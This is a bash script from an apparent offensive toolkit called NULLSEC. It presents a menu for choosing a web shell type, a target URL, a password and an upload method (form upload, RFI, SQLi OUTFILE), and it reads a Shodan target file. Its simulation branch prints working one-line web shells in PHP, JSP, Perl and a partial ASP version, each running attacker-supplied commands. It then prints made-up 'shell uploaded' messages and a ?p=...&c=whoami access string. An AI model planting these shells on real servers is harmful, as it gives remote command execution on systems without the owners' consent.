#!/bin/bash
# NULLSEC Web Shell - bad-antics development

# Source common library for Shodan integration

# === NULLSEC ENHANCED LOGGING ===
TARGET_DIR="${NULLSEC_TARGET_DIR:-$HOME/nullsec/logs/targets/default}"
LOG_FILE="${NULLSEC_LOG_FILE:-$TARGET_DIR/module.log}"

# Helper function: Log to file with timestamp
log_to_file() {
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] $1" >> "$LOG_FILE"
}

# Helper function: Save output to target directory
save_output() {
    local filename="$1"
    local content="$2"
    echo "$content" > "$TARGET_DIR/$filename"
    log_to_file "Saved output to $TARGET_DIR/$filename"
}

# Helper function: Log discovered vulnerability
log_vulnerability() {
    local severity="$1"
    local title="$2"
    local description="$3"
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] VULNERABILITY [$severity] $title - $description" >> "$LOG_FILE"
}

# Read environment variables set by framework

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "$SCRIPT_DIR/nullsec-common.sh" 2>/dev/null

# Check for Shodan target
SHODAN_TARGET="/home/antics/nullsec/.shodan_target"
if [ -f "$SHODAN_TARGET" ]; then
    source "$SHODAN_TARGET"
    if [ ! -z "$TARGET" ]; then
        echo -e "${GREEN}[+]${RESET} Shodan target available: ${GREEN}$TARGET${RESET}"
    fi
fi

RED='\033[1;31m'; GREEN='\033[1;32m'; YELLOW='\033[1;33m'; CYAN='\033[1;36m'; WHITE='\033[1;37m'; DIM='\033[2m'; RESET='\033[0m'
clear
echo -e "${RED}▓▓▓ NULLSEC WEBSHELL ▓▓▓${RESET} ${CYAN}[ bad-antics ]${RESET}"
echo ""
echo -e "  ${YELLOW}Shell type:${RESET}"
echo -e "    ${DIM}1) PHP${RESET}"
echo -e "    ${DIM}2) ASP/ASPX${RESET}"
echo -e "    ${DIM}3) JSP${RESET}"
echo -e "    ${DIM}4) CGI/Perl${RESET}"
read -p "$(echo -e ${WHITE}'  [>] Select [1-4]: '${RESET})" SHELL_TYPE; [ -z "$SHELL_TYPE" ] && SHELL_TYPE="1"
read -p "$(echo -e ${WHITE}'  [>] Target URL: '${RESET})" TARGET; [ -z "$TARGET" ] && TARGET="http://target.com/uploads/"
read -p "$(echo -e ${WHITE}'  [>] Shell password: '${RESET})" PASSWORD; [ -z "$PASSWORD" ] && PASSWORD="nullsec"
read -p "$(echo -e ${WHITE}'  [>] Upload method (1-Form 2-RFI 3-SQLi): '${RESET})" METHOD; [ -z "$METHOD" ] && METHOD="1"
read -p "$(echo -e ${YELLOW}'  [!] SIMULATION? (y/N): '${RESET})" TEST_MODE; TEST_MODE=${TEST_MODE:-n}
echo ""
if [[ "$TEST_MODE" =~ ^[Yy]$ ]]; then
    types=("PHP" "ASP" "JSP" "CGI")
    methods=("File Upload" "RFI" "SQLi OUTFILE")
    echo -e "${YELLOW}[*]${RESET} Executing ${types[$((SHELL_TYPE-1))]} webshell"
    echo -e "${DIM}[*] Method: ${methods[$((METHOD-1))]}${RESET}"; sleep 0.4
    echo -e "${DIM}[*] Generating shell...${RESET}"; sleep 0.5
    case $SHELL_TYPE in
        1) echo -e "${CYAN}<?php if(\$_GET['p']=='$PASSWORD')system(\$_GET['c']); ?>${RESET}" ;;
        2) echo -e "${CYAN}<%@ Page Language=\"C#\" %><% if(Request[\"p\"]==\"$PASSWORD\")... %>${RESET}" ;;
        3) echo -e "${CYAN}<% Runtime.exec(request.getParameter(\"c\")); %>${RESET}" ;;
        4) echo -e "${CYAN}#!/usr/bin/perl\nprint system(\$ARGV[0]);${RESET}" ;;
    esac
    echo ""
    echo -e "${GREEN}[+]${RESET} Shell uploaded to: ${TARGET}shell.${types[$((SHELL_TYPE-1))]:0:3}"
    echo -e "${GREEN}[+]${RESET} Access: ?p=$PASSWORD&c=whoami"
    echo -e "${GREEN}[✓]${RESET} SIMULATION complete"
else
    echo -e "${RED}[*]${RESET} Use weevely or manual upload"
fi
